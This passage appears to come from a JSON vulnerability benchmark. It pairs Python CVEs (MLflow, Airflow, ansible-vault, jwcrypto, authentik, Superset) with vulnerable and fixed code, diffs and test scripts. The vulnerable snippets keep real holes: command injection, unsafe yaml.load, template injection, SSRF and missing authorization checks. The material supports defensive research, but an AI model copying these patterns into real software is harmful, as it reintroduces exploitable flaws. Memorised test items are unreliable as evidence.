        "snippet": "    def predict(self, model_uri, input_path, output_path, content_type):\n        \"\"\"\n        Generate predictions using generic python model saved with MLflow. The expected format of\n        the input JSON is the Mlflow scoring format.\n        Return the prediction results as a JSON.\n        \"\"\"\n        local_path = _download_artifact_from_uri(model_uri)\n        # NB: Absolute windows paths do not work with mlflow apis, use file uri to ensure\n        # platform compatibility.\n        local_uri = path_to_local_file_uri(local_path)\n\n        if self._env_manager != _EnvManager.LOCAL:\n            command = (\n                'python -c \"from mlflow.pyfunc.scoring_server import _predict; _predict('\n                \"model_uri={model_uri}, \"\n                \"input_path={input_path}, \"\n                \"output_path={output_path}, \"\n                \"content_type={content_type})\"\n                '\"'\n            ).format(\n                model_uri=repr(local_uri),\n                input_path=repr(input_path),\n                output_path=repr(output_path),\n                content_type=repr(content_type),\n            )\n            return self.prepare_env(local_path).execute(command)\n        else:\n            scoring_server._predict(local_uri, input_path, output_path, content_type)"
      },
      {
        "id": "vul_py_235_2",
        "commit": "330bf0b",
        "file_path": "mlflow/pyfunc/backend.py",
        "start_line": 326,
        "end_line": 363,
        "snippet": "            setup_pyenv_and_virtualenv=setup_pyenv_and_virtualenv,\n            install_mlflow=install_mlflow,\n            custom_setup_steps=custom_setup_steps,\n            entrypoint=pyfunc_entrypoint,\n        )\n        _logger.debug(\"generated dockerfile text\", extra={\"dockerfile\": dockerfile_text})\n\n        with open(os.path.join(output_path, \"Dockerfile\"), \"w\") as dockerfile:\n            dockerfile.write(dockerfile_text)\n\n    def build_image(\n        self, model_uri, image_name, install_mlflow=False, mlflow_home=None, enable_mlserver=False\n    ):\n        copy_model_into_container = self.copy_model_into_container_wrapper(\n            model_uri, install_mlflow, enable_mlserver\n        )\n        pyfunc_entrypoint = _pyfunc_entrypoint(\n            self._env_manager, model_uri, install_mlflow, enable_mlserver\n        )\n        _build_image(\n            image_name=image_name,\n            mlflow_home=mlflow_home,\n            env_manager=self._env_manager,\n            custom_setup_steps_hook=copy_model_into_container,\n            entrypoint=pyfunc_entrypoint,\n        )\n\n    def copy_model_into_container_wrapper(self, model_uri, install_mlflow, enable_mlserver):\n        def copy_model_into_container(dockerfile_context_dir):\n            # This function have to be included in another,\n            # since `_build_image` function in `docker_utils` accepts only\n            # single-argument function like this\n            model_cwd = os.path.join(dockerfile_context_dir, \"model_dir\")\n            pathlib.Path(model_cwd).mkdir(parents=True, exist_ok=True)\n            if model_uri:\n                model_path = _download_artifact_from_uri(model_uri, output_path=model_cwd)\n                return \"\"\"\n                    COPY {model_dir} /opt/ml/model"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_235_1",
        "commit": "6dde937",
        "file_path": "mlflow/pyfunc/backend.py",
        "start_line": 136,
        "end_line": 162,
        "snippet": "    def predict(self, model_uri, input_path, output_path, content_type):\n        \"\"\"\n        Generate predictions using generic python model saved with MLflow. The expected format of\n        the input JSON is the Mlflow scoring format.\n        Return the prediction results as a JSON.\n        \"\"\"\n        local_path = _download_artifact_from_uri(model_uri)\n        # NB: Absolute windows paths do not work with mlflow apis, use file uri to ensure\n        # platform compatibility.\n        local_uri = path_to_local_file_uri(local_path)\n\n        if self._env_manager != _EnvManager.LOCAL:\n            predict_cmd = [\n                \"python\",\n                _mlflow_pyfunc_backend_predict.__file__,\n                \"--model-uri\",\n                str(local_uri),\n                \"--content-type\",\n                shlex.quote(str(content_type)),\n            ]\n            if input_path:\n                predict_cmd += [\"--input-path\", shlex.quote(str(input_path))]\n            if output_path:\n                predict_cmd += [\"--output-path\", shlex.quote(str(output_path))]\n            return self.prepare_env(local_path).execute(\" \".join(predict_cmd))\n        else:\n            scoring_server._predict(local_uri, input_path, output_path, content_type)"
      },
      {
        "id": "fix_py_235_2",
        "commit": "6dde937",
        "file_path": "mlflow/pyfunc/backend.py",
        "start_line": 328,
        "end_line": 367,
        "snippet": "            install_mlflow=install_mlflow,\n            custom_setup_steps=custom_setup_steps,\n            entrypoint=pyfunc_entrypoint,\n        )\n        _logger.debug(\"generated dockerfile text\", extra={\"dockerfile\": dockerfile_text})\n\n        with open(os.path.join(output_path, \"Dockerfile\"), \"w\") as dockerfile:\n            dockerfile.write(dockerfile_text)\n\n    def build_image(\n        self, model_uri, image_name, install_mlflow=False, mlflow_home=None, enable_mlserver=False\n    ):\n        copy_model_into_container = self.copy_model_into_container_wrapper(\n            model_uri, install_mlflow, enable_mlserver\n        )\n        pyfunc_entrypoint = _pyfunc_entrypoint(\n            self._env_manager, model_uri, install_mlflow, enable_mlserver\n        )\n        _build_image(\n            image_name=image_name,\n            mlflow_home=mlflow_home,\n            env_manager=self._env_manager,\n            custom_setup_steps_hook=copy_model_into_container,\n            entrypoint=pyfunc_entrypoint,\n        )\n\n    def copy_model_into_container_wrapper(self, model_uri, install_mlflow, enable_mlserver):\n        def copy_model_into_container(dockerfile_context_dir):\n            # This function have to be included in another,\n            # since `_build_image` function in `docker_utils` accepts only\n            # single-argument function like this\n            model_cwd = os.path.join(dockerfile_context_dir, \"model_dir\")\n            pathlib.Path(model_cwd).mkdir(parents=True, exist_ok=True)\n            if model_uri:\n                model_path = _download_artifact_from_uri(model_uri, output_path=model_cwd)\n                return \"\"\"\n                    COPY {model_dir} /opt/ml/model\n                    RUN python -c \\\n                    'from mlflow.models.container import _install_pyfunc_deps;\\\n                    _install_pyfunc_deps(\\"
      }
    ],
    "vul_patch": "--- a/mlflow/pyfunc/backend.py\n+++ b/mlflow/pyfunc/backend.py\n@@ -10,19 +10,18 @@\n         local_uri = path_to_local_file_uri(local_path)\n \n         if self._env_manager != _EnvManager.LOCAL:\n-            command = (\n-                'python -c \"from mlflow.pyfunc.scoring_server import _predict; _predict('\n-                \"model_uri={model_uri}, \"\n-                \"input_path={input_path}, \"\n-                \"output_path={output_path}, \"\n-                \"content_type={content_type})\"\n-                '\"'\n-            ).format(\n-                model_uri=repr(local_uri),\n-                input_path=repr(input_path),\n-                output_path=repr(output_path),\n-                content_type=repr(content_type),\n-            )\n-            return self.prepare_env(local_path).execute(command)\n+            predict_cmd = [\n+                \"python\",\n+                _mlflow_pyfunc_backend_predict.__file__,\n+                \"--model-uri\",\n+                str(local_uri),\n+                \"--content-type\",\n+                shlex.quote(str(content_type)),\n+            ]\n+            if input_path:\n+                predict_cmd += [\"--input-path\", shlex.quote(str(input_path))]\n+            if output_path:\n+                predict_cmd += [\"--output-path\", shlex.quote(str(output_path))]\n+            return self.prepare_env(local_path).execute(\" \".join(predict_cmd))\n         else:\n             scoring_server._predict(local_uri, input_path, output_path, content_type)\n\n--- a/mlflow/pyfunc/backend.py\n+++ b/mlflow/pyfunc/backend.py\n@@ -1,4 +1,3 @@\n-            setup_pyenv_and_virtualenv=setup_pyenv_and_virtualenv,\n             install_mlflow=install_mlflow,\n             custom_setup_steps=custom_setup_steps,\n             entrypoint=pyfunc_entrypoint,\n@@ -36,3 +35,6 @@\n                 model_path = _download_artifact_from_uri(model_uri, output_path=model_cwd)\n                 return \"\"\"\n                     COPY {model_dir} /opt/ml/model\n+                    RUN python -c \\\n+                    'from mlflow.models.container import _install_pyfunc_deps;\\\n+                    _install_pyfunc_deps(\\\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2017-2809",
    "cve_description": "An exploitable vulnerability exists in the yaml loading functionality of ansible-vault before 1.0.5. A specially crafted vault can execute arbitrary python commands resulting in command execution. An attacker can insert python into the vault to trigger this vulnerability.",
    "cwe_info": {
      "CWE-94": {
        "name": "Improper Control of Generation of Code ('Code Injection')",
        "description": "The product constructs all or part of a code segment using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the syntax or behavior of the intended code segment."
      },
      "CWE-77": {
        "name": "Improper Neutralization of Special Elements used in a Command ('Command Injection')",
        "description": "The product constructs all or part of a command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended command when it is sent to a downstream component."
      },
      "CWE-78": {
        "name": "Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')",
        "description": "The product constructs all or part of an OS command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended OS command when it is sent to a downstream component."
      }
    },
    "repo": "https://github.com/tomoh1r/ansible-vault",
    "patch_url": [
      "https://github.com/tomoh1r/ansible-vault/commit/3f8f659ef443ab870bb19f95d43543470168ae04"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_372_1",
        "commit": "1ae50a312349656280fbe7d2acfbda9c1d560dd1",
        "file_path": "ansible_vault/api.py",
        "start_line": 16,
        "end_line": 18,
        "snippet": "    def load(self, stream):\n        '''read vault steam and return python object'''\n        return yaml.load(self.vault.decrypt(stream))"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_372_1",
        "commit": "3f8f659ef443ab870bb19f95d43543470168ae04",
        "file_path": "ansible_vault/api.py",
        "start_line": 16,
        "end_line": 18,
        "snippet": "    def load(self, stream):\n        '''read vault steam and return python object'''\n        return yaml.safe_load(self.vault.decrypt(stream))"
      }
    ],
    "vul_patch": "--- a/ansible_vault/api.py\n+++ b/ansible_vault/api.py\n@@ -1,3 +1,3 @@\n     def load(self, stream):\n         '''read vault steam and return python object'''\n-        return yaml.load(self.vault.decrypt(stream))\n+        return yaml.safe_load(self.vault.decrypt(stream))\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2024-39877",
    "cve_description": "Apache Airflow 2.4.0, and versions before 2.9.3, has a vulnerability that allows authenticated DAG authors to craft a doc_md parameter in a way that could execute arbitrary code in the scheduler context, which should be forbidden according to the Airflow Security model. Users should upgrade to version 2.9.3 or later which has removed the vulnerability.",
    "cwe_info": {
      "CWE-94": {
        "name": "Improper Control of Generation of Code ('Code Injection')",
        "description": "The product constructs all or part of a code segment using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the syntax or behavior of the intended code segment."
      },
      "CWE-77": {
        "name": "Improper Neutralization of Special Elements used in a Command ('Command Injection')",
        "description": "The product constructs all or part of a command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended command when it is sent to a downstream component."
      },
      "CWE-78": {
        "name": "Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')",
        "description": "The product constructs all or part of an OS command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended OS command when it is sent to a downstream component."
      }
    },
    "repo": "https://github.com/apache/airflow",
    "patch_url": [
      "https://github.com/apache/airflow/commit/8159f6e24704f5e0e3b3217cf79ecf5083dce531"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_20_1",
        "commit": "09bbc9c",
        "file_path": "airflow/models/dag.py",
        "start_line": 771,
        "end_line": 788,
        "snippet": "    def get_doc_md(self, doc_md: str | None) -> str | None:\n        if doc_md is None:\n            return doc_md\n\n        env = self.get_template_env(force_sandboxed=True)\n\n        if not doc_md.endswith(\".md\"):\n            template = jinja2.Template(doc_md)\n        else:\n            try:\n                template = env.get_template(doc_md)\n            except jinja2.exceptions.TemplateNotFound:\n                return f\"\"\"\n                # Templating Error!\n                Not able to find the template file: `{doc_md}`.\n                \"\"\"\n\n        return template.render()"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_20_1",
        "commit": "8159f6e",
        "file_path": "airflow/models/dag.py",
        "start_line": 771,
        "end_line": 781,
        "snippet": "    def get_doc_md(self, doc_md: str | None) -> str | None:\n        if doc_md is None:\n            return doc_md\n\n        if doc_md.endswith(\".md\"):\n            try:\n                return open(doc_md).read()\n            except FileNotFoundError:\n                return doc_md\n\n        return doc_md"
      }
    ],
    "vul_patch": "--- a/airflow/models/dag.py\n+++ b/airflow/models/dag.py\n@@ -2,17 +2,10 @@\n         if doc_md is None:\n             return doc_md\n \n-        env = self.get_template_env(force_sandboxed=True)\n+        if doc_md.endswith(\".md\"):\n+            try:\n+                return open(doc_md).read()\n+            except FileNotFoundError:\n+                return doc_md\n \n-        if not doc_md.endswith(\".md\"):\n-            template = jinja2.Template(doc_md)\n-        else:\n-            try:\n-                template = env.get_template(doc_md)\n-            except jinja2.exceptions.TemplateNotFound:\n-                return f\"\"\"\n-                # Templating Error!\n-                Not able to find the template file: `{doc_md}`.\n-                \"\"\"\n-\n-        return template.render()\n+        return doc_md\n\n",
    "poc_test_cmd": "#!/bin/bash\n# From ghcr.io/anonymous2578-data/cve-2024-39877:latest\n# bash /workspace/fix-run.sh\nset -e\n\ncd /workspace/airflow\ngit apply --whitespace=nowarn /workspace/test.patch /workspace/fix.patch\ncd tests && /workspace/PoC_env/CVE-2024-39877/bin/python -m pytest models/test_dag.py -v -k \"test_resolve_documentation_template_file_not_rendered\" -p no:warning\n",
    "unit_test_cmd": "#!/bin/bash\n# From ghcr.io/anonymous2578-data/cve-2024-39877:latest\n# bash /workspace/unit_test.sh\nset -e\n\ncd /workspace/airflow\ngit apply --whitespace=nowarn /workspace/fix.patch\ncd tests && /workspace/PoC_env/CVE-2024-39877/bin/python -m pytest models/test_dag.py -v -k \"not test_resolve_documentation_template_file_rendered\" -p no:warning\n"
  },
  {
    "cve_id": "CVE-2022-38649",
    "cve_description": "Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection') vulnerability in Apache Airflow Pinot Provider, Apache Airflow allows an attacker to control commands executed in the task execution context, without write access to DAG files. This issue affects Apache Airflow Pinot Provider versions prior to 4.0.0. It also impacts any Apache Airflow versions prior to 2.3.0 in case Apache Airflow Pinot Provider is installed (Apache Airflow Pinot Provider 4.0.0 can only be installed for Airflow 2.3.0+). Note that you need to manually install the Pinot Provider version 4.0.0 in order to get rid of the vulnerability on top of Airflow 2.3.0+ version.",
    "cwe_info": {
      "CWE-94": {
        "name": "Improper Control of Generation of Code ('Code Injection')",
        "description": "The product constructs all or part of a code segment using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the syntax or behavior of the intended code segment."
      },
      "CWE-77": {
        "name": "Improper Neutralization of Special Elements used in a Command ('Command Injection')",
        "description": "The product constructs all or part of a command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended command when it is sent to a downstream component."
      },
      "CWE-78": {
        "name": "Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')",
        "description": "The product constructs all or part of an OS command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended OS command when it is sent to a downstream component."
      }
    },
    "repo": "https://github.com/apache/airflow",
    "patch_url": [
      "https://github.com/apache/airflow/commit/1d4fd5c6eacab0b88f8660f9d780174434393f1a"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_153_1",
        "commit": "d6cb703",
        "file_path": "airflow/providers/apache/pinot/hooks/pinot.py",
        "start_line": 55,
        "end_line": 69,
        "snippet": "    def __init__(\n        self,\n        conn_id: str = \"pinot_admin_default\",\n        cmd_path: str = \"pinot-admin.sh\",\n        pinot_admin_system_exit: bool = False,\n    ) -> None:\n        super().__init__()\n        conn = self.get_connection(conn_id)\n        self.host = conn.host\n        self.port = str(conn.port)\n        self.cmd_path = conn.extra_dejson.get(\"cmd_path\", cmd_path)\n        self.pinot_admin_system_exit = conn.extra_dejson.get(\n            \"pinot_admin_system_exit\", pinot_admin_system_exit\n        )\n        self.conn = conn"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_153_1",
        "commit": "1d4fd5c",
        "file_path": "airflow/providers/apache/pinot/hooks/pinot.py",
        "start_line": 58,
        "end_line": 80,
        "snippet": "    def __init__(\n        self,\n        conn_id: str = \"pinot_admin_default\",\n        cmd_path: str = \"pinot-admin.sh\",\n        pinot_admin_system_exit: bool = False,\n    ) -> None:\n        super().__init__()\n        conn = self.get_connection(conn_id)\n        self.host = conn.host\n        self.port = str(conn.port)\n        if cmd_path != \"pinot-admin.sh\":\n            raise RuntimeError(\n                \"In version 4.0.0 of the PinotAdminHook the cmd_path has been hard-coded to\"\n                \" pinot-admin.sh. In order to avoid accidental using of this parameter as\"\n                \" positional `pinot_admin_system_exit` the `cmd_parameter`\"\n                \" parameter is left here but you should not modify it. Make sure that \"\n                \" `pinot-admin.sh` is on your PATH and do not change cmd_path value.\"\n            )\n        self.cmd_path = \"pinot-admin.sh\"\n        self.pinot_admin_system_exit = conn.extra_dejson.get(\n            \"pinot_admin_system_exit\", pinot_admin_system_exit\n        )\n        self.conn = conn"
      }
    ],
    "vul_patch": "--- a/airflow/providers/apache/pinot/hooks/pinot.py\n+++ b/airflow/providers/apache/pinot/hooks/pinot.py\n@@ -8,7 +8,15 @@\n         conn = self.get_connection(conn_id)\n         self.host = conn.host\n         self.port = str(conn.port)\n-        self.cmd_path = conn.extra_dejson.get(\"cmd_path\", cmd_path)\n+        if cmd_path != \"pinot-admin.sh\":\n+            raise RuntimeError(\n+                \"In version 4.0.0 of the PinotAdminHook the cmd_path has been hard-coded to\"\n+                \" pinot-admin.sh. In order to avoid accidental using of this parameter as\"\n+                \" positional `pinot_admin_system_exit` the `cmd_parameter`\"\n+                \" parameter is left here but you should not modify it. Make sure that \"\n+                \" `pinot-admin.sh` is on your PATH and do not change cmd_path value.\"\n+            )\n+        self.cmd_path = \"pinot-admin.sh\"\n         self.pinot_admin_system_exit = conn.extra_dejson.get(\n             \"pinot_admin_system_exit\", pinot_admin_system_exit\n         )\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2016-6298",
    "cve_description": "The _Rsa15 class in the RSA 1.5 algorithm implementation in jwa.py in jwcrypto before 0.3.2 lacks the Random Filling protection mechanism, which makes it easier for remote attackers to obtain cleartext data via a Million Message Attack (MMA).",
    "cwe_info": {
      "CWE-200": {
        "name": "Exposure of Sensitive Information to an Unauthorized Actor",
        "description": "The product exposes sensitive information to an actor that is not explicitly authorized to have access to that information."
      }
    },
    "repo": "https://github.com/latchset/jwcrypto",
    "patch_url": [
      "https://github.com/latchset/jwcrypto/commit/eb5be5bd94c8cae1d7f3ba9801377084d8e5a7ba"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_412_1",
        "commit": "9282e1e9a73caf948ea9c8958e29790feae5eeba",
        "file_path": "jwcrypto/jwa.py",
        "start_line": 371,
        "end_line": 380,
        "snippet": "class _Rsa15(_RSA, JWAAlgorithm):\n\n    name = 'RSA1_5'\n    description = \"RSAES-PKCS1-v1_5\"\n    keysize = 2048\n    algorithm_usage_location = 'alg'\n    algorithm_use = 'kex'\n\n    def __init__(self):\n        super(_Rsa15, self).__init__(padding.PKCS1v15())"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_412_1",
        "commit": "eb5be5bd94c8cae1d7f3ba9801377084d8e5a7ba",
        "file_path": "jwcrypto/jwa.py",
        "start_line": 371,
        "end_line": 397,
        "snippet": "class _Rsa15(_RSA, JWAAlgorithm):\n\n    name = 'RSA1_5'\n    description = \"RSAES-PKCS1-v1_5\"\n    keysize = 2048\n    algorithm_usage_location = 'alg'\n    algorithm_use = 'kex'\n\n    def __init__(self):\n        super(_Rsa15, self).__init__(padding.PKCS1v15())\n\n    def unwrap(self, key, bitsize, ek, headers):\n        self._check_key(key)\n        # Address MMA attack by implementing RFC 3218 - 2.3.2. Random Filling\n        # provides a random cek that will cause the decryption engine to\n        # run to the end, but will fail decryption later.\n\n        # always generate a random cek so we spend roughly the\n        # same time as in the exception side of the branch\n        cek = _randombits(bitsize)\n        try:\n            cek = super(_Rsa15, self).unwrap(key, bitsize, ek, headers)\n            # always raise so we always run through the exception handling\n            # code in all cases\n            raise Exception('Dummy')\n        except Exception:  # pylint: disable=broad-except\n            return cek"
      }
    ],
    "vul_patch": "--- a/jwcrypto/jwa.py\n+++ b/jwcrypto/jwa.py\n@@ -8,3 +8,20 @@\n \n     def __init__(self):\n         super(_Rsa15, self).__init__(padding.PKCS1v15())\n+\n+    def unwrap(self, key, bitsize, ek, headers):\n+        self._check_key(key)\n+        # Address MMA attack by implementing RFC 3218 - 2.3.2. Random Filling\n+        # provides a random cek that will cause the decryption engine to\n+        # run to the end, but will fail decryption later.\n+\n+        # always generate a random cek so we spend roughly the\n+        # same time as in the exception side of the branch\n+        cek = _randombits(bitsize)\n+        try:\n+            cek = super(_Rsa15, self).unwrap(key, bitsize, ek, headers)\n+            # always raise so we always run through the exception handling\n+            # code in all cases\n+            raise Exception('Dummy')\n+        except Exception:  # pylint: disable=broad-except\n+            return cek\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2024-47077",
    "cve_description": "authentik is an open-source identity provider. Prior to versions 2024.8.3 and 2024.6.5, access tokens issued to one application can be stolen by that application and used to impersonate the user against any other proxy provider. Also, a user can steal an access token they were legitimately issued for one application and use it to access another application that they aren't allowed to access. Anyone who has more than one proxy provider application with different trust domains or different access control is affected. Versions 2024.8.3 and 2024.6.5 fix the issue.",
    "cwe_info": {
      "CWE-863": {
        "name": "Incorrect Authorization",
        "description": "The product performs an authorization check when an actor attempts to access a resource or perform an action, but it does not correctly perform the check."
      }
    },
    "repo": "https://github.com/goauthentik/authentik",
    "patch_url": [
      "https://github.com/goauthentik/authentik/commit/22e586bd8cdc3d1db8a0f18314d76f82371129b2"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_140_1",
        "commit": "8a0b31b",
        "file_path": "authentik/providers/oauth2/views/introspection.py",
        "start_line": 42,
        "end_line": 56,
        "snippet": "    def from_request(request: HttpRequest) -> \"TokenIntrospectionParams\":\n        \"\"\"Extract required Parameters from HTTP Request\"\"\"\n        raw_token = request.POST.get(\"token\")\n        provider = authenticate_provider(request)\n        if not provider:\n            raise TokenIntrospectionError\n\n        access_token = AccessToken.objects.filter(token=raw_token).first()\n        if access_token:\n            return TokenIntrospectionParams(access_token, provider)\n        refresh_token = RefreshToken.objects.filter(token=raw_token).first()\n        if refresh_token:\n            return TokenIntrospectionParams(refresh_token, provider)\n        LOGGER.debug(\"Token does not exist\", token=raw_token)\n        raise TokenIntrospectionError()"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_140_1",
        "commit": "22e586b",
        "file_path": "authentik/providers/oauth2/views/introspection.py",
        "start_line": 42,
        "end_line": 56,
        "snippet": "    def from_request(request: HttpRequest) -> \"TokenIntrospectionParams\":\n        \"\"\"Extract required Parameters from HTTP Request\"\"\"\n        raw_token = request.POST.get(\"token\")\n        provider = authenticate_provider(request)\n        if not provider:\n            raise TokenIntrospectionError\n\n        access_token = AccessToken.objects.filter(token=raw_token, provider=provider).first()\n        if access_token:\n            return TokenIntrospectionParams(access_token, provider)\n        refresh_token = RefreshToken.objects.filter(token=raw_token, provider=provider).first()\n        if refresh_token:\n            return TokenIntrospectionParams(refresh_token, provider)\n        LOGGER.debug(\"Token does not exist\", token=raw_token)\n        raise TokenIntrospectionError()"
      }
    ],
    "vul_patch": "--- a/authentik/providers/oauth2/views/introspection.py\n+++ b/authentik/providers/oauth2/views/introspection.py\n@@ -5,10 +5,10 @@\n         if not provider:\n             raise TokenIntrospectionError\n \n-        access_token = AccessToken.objects.filter(token=raw_token).first()\n+        access_token = AccessToken.objects.filter(token=raw_token, provider=provider).first()\n         if access_token:\n             return TokenIntrospectionParams(access_token, provider)\n-        refresh_token = RefreshToken.objects.filter(token=raw_token).first()\n+        refresh_token = RefreshToken.objects.filter(token=raw_token, provider=provider).first()\n         if refresh_token:\n             return TokenIntrospectionParams(refresh_token, provider)\n         LOGGER.debug(\"Token does not exist\", token=raw_token)\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2023-6974",
    "cve_description": "A malicious user could use this issue to access internal HTTP(s) servers and in the worst case (ie: aws instance) it could be abuse to get a remote code execution on the victim machine.",
    "cwe_info": {
      "CWE-918": {
        "name": "Server-Side Request Forgery (SSRF)",
        "description": "The web server receives a URL or similar request from an upstream component and retrieves the contents of this URL, but it does not sufficiently ensure that the request is being sent to the expected destination."
      }
    },
    "repo": "https://github.com/mlflow/mlflow",
    "patch_url": [
      "https://github.com/mlflow/mlflow/commit/8174250f83352a04c2d42079f414759060458555"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_260_1",
        "commit": "65cfc3c",
        "file_path": "mlflow/utils/request_utils.py",
        "start_line": 160,
        "end_line": 190,
        "snippet": "def _get_http_response_with_retries(\n    method,\n    url,\n    max_retries,\n    backoff_factor,\n    backoff_jitter,\n    retry_codes,\n    raise_on_status=True,\n    **kwargs,\n):\n    \"\"\"\n    Performs an HTTP request using Python's `requests` module with an automatic retry policy.\n\n    :param method: a string indicating the method to use, e.g. \"GET\", \"POST\", \"PUT\".\n    :param url: the target URL address for the HTTP request.\n    :param max_retries: Maximum total number of retries.\n    :param backoff_factor: a time factor for exponential backoff. e.g. value 5 means the HTTP\n      request will be retried with interval 5, 10, 20... seconds. A value of 0 turns off the\n      exponential backoff.\n    :param backoff_jitter: A random jitter to add to the backoff interval.\n    :param retry_codes: a list of HTTP response error codes that qualifies for retry.\n    :param raise_on_status: whether to raise an exception, or return a response, if status falls\n      in retry_codes range and retries have been exhausted.\n    :param kwargs: Additional keyword arguments to pass to `requests.Session.request()`\n\n    :return: requests.Response object.\n    \"\"\"\n    session = _get_request_session(\n        max_retries, backoff_factor, backoff_jitter, retry_codes, raise_on_status\n    )\n    return session.request(method, url, **kwargs)"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_260_1",
        "commit": "8174250",
        "file_path": "mlflow/utils/request_utils.py",
        "start_line": 160,
        "end_line": 197,
        "snippet": "def _get_http_response_with_retries(\n    method,\n    url,\n    max_retries,\n    backoff_factor,\n    backoff_jitter,\n    retry_codes,\n    raise_on_status=True,\n    allow_redirects=None,\n    **kwargs,\n):\n    \"\"\"\n    Performs an HTTP request using Python's `requests` module with an automatic retry policy.\n\n    :param method: a string indicating the method to use, e.g. \"GET\", \"POST\", \"PUT\".\n    :param url: the target URL address for the HTTP request.\n    :param max_retries: Maximum total number of retries.\n    :param backoff_factor: a time factor for exponential backoff. e.g. value 5 means the HTTP\n      request will be retried with interval 5, 10, 20... seconds. A value of 0 turns off the\n      exponential backoff.\n    :param backoff_jitter: A random jitter to add to the backoff interval.\n    :param retry_codes: a list of HTTP response error codes that qualifies for retry.\n    :param raise_on_status: whether to raise an exception, or return a response, if status falls\n      in retry_codes range and retries have been exhausted.\n    :param kwargs: Additional keyword arguments to pass to `requests.Session.request()`\n\n    :return: requests.Response object.\n    \"\"\"\n    session = _get_request_session(\n        max_retries, backoff_factor, backoff_jitter, retry_codes, raise_on_status\n    )\n\n    # the environment variable is hardcoded here to avoid importing mlflow.\n    # however, documentation is available in environment_variables.py\n    env_value = os.getenv(\"MLFLOW_ALLOW_HTTP_REDIRECTS\", \"true\").lower() in [\"true\", \"1\"]\n    allow_redirects = env_value if allow_redirects is None else allow_redirects\n\n    return session.request(method, url, allow_redirects=allow_redirects, **kwargs)"
      },
      {
        "id": "fix_py_260_2",
        "commit": "8174250",
        "file_path": "mlflow/environment_variables.py",
        "start_line": 501,
        "end_line": 501,
        "snippet": "MLFLOW_ALLOW_HTTP_REDIRECTS = _BooleanEnvironmentVariable(\"MLFLOW_ALLOW_HTTP_REDIRECTS\", True)"
      }
    ],
    "vul_patch": "--- a/mlflow/utils/request_utils.py\n+++ b/mlflow/utils/request_utils.py\n@@ -6,6 +6,7 @@\n     backoff_jitter,\n     retry_codes,\n     raise_on_status=True,\n+    allow_redirects=None,\n     **kwargs,\n ):\n     \"\"\"\n@@ -28,4 +29,10 @@\n     session = _get_request_session(\n         max_retries, backoff_factor, backoff_jitter, retry_codes, raise_on_status\n     )\n-    return session.request(method, url, **kwargs)\n+\n+    # the environment variable is hardcoded here to avoid importing mlflow.\n+    # however, documentation is available in environment_variables.py\n+    env_value = os.getenv(\"MLFLOW_ALLOW_HTTP_REDIRECTS\", \"true\").lower() in [\"true\", \"1\"]\n+    allow_redirects = env_value if allow_redirects is None else allow_redirects\n+\n+    return session.request(method, url, allow_redirects=allow_redirects, **kwargs)\n\n--- /dev/null\n+++ b/mlflow/utils/request_utils.py\n@@ -0,0 +1 @@\n+MLFLOW_ALLOW_HTTP_REDIRECTS = _BooleanEnvironmentVariable(\"MLFLOW_ALLOW_HTTP_REDIRECTS\", True)\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2024-53949",
    "cve_description": "Improper Authorization vulnerability in Apache Superset when\u00a0FAB_ADD_SECURITY_API is enabled (disabled by default). Allows for lower privilege users to use this API.\n\n\u00a0issue affects Apache Superset: from 2.0.0 before 4.1.0.\n\nUsers are recommended to upgrade to version 4.1.0, which fixes the issue.",
    "cwe_info": {
      "CWE-285": {
        "name": "Improper Authorization",
        "description": "The product does not perform or incorrectly performs an authorization check when an actor attempts to access a resource or perform an action."
      },
      "CWE-250": {
        "name": "Execution with Unnecessary Privileges",
        "description": "The product performs an operation at a privilege level that is higher than the minimum level required, which creates new weaknesses or amplifies the consequences of other weaknesses."
      },
      "CWE-269": {
        "name": "Improper Privilege Management",
        "description": "The product does not properly assign, modify, track, or check privileges for an actor, creating an unintended sphere of control for that actor."
      }
    },
    "repo": "https://github.com/apache/superset",
    "patch_url": [
      "https://github.com/apache/superset/commit/7650c47e72f28559e91524f5d68d50c2060df4c7"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_323_1",
        "commit": "1818054",
        "file_path": "superset/security/manager.py",
        "start_line": 226,
        "end_line": 241,
